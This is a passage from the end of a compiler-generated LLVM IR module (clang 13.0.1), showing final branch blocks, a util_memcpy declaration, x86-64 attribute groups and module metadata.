488:                                              ; preds = %483
  br label %490

489:                                              ; preds = %483
  br label %264

490:                                              ; preds = %94, %100, %488
  ret void
}

declare void @util_memcpy(i8*, i8*, i32) #2

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind }
attributes #5 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
